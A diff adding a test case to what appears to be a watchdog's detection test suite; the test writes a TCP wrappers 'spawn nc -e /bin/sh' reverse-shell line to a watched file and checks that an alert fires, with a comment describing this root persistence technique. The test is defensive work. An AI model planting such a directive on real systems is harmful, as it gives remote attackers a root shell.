@@ -243,3 +243,21 @@ seed_benign() {
     run_wd
     cap | grep -q '"severity":"alert"'
 }
+
+@test "INVARIANT (nc reverse-shell variant in tcpwrappers spawn: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
+    # Sister to the brain-wide nc reverse-shell variant INVARIANT
+    # family already locked. The tcpwrappers spawn directive fires
+    # AS ROOT (when sshd / vsftpd / inetd-style daemons are running
+    # as root and reject a connection) on every matching incoming
+    # connection — a recurring trigger fired by REMOTE attackers
+    # (not local). Most dangerous of the brain-wide family because
+    # the attacker doesn't even need foothold to trigger the
+    # callback. Closes the nc reverse-shell sister axis on the
+    # remote-trigger root-exec persistence surface.
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf 'ALL: ALL: spawn nc -e /bin/sh 1.1.1.1 4444\n' > "${HALLOW}"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
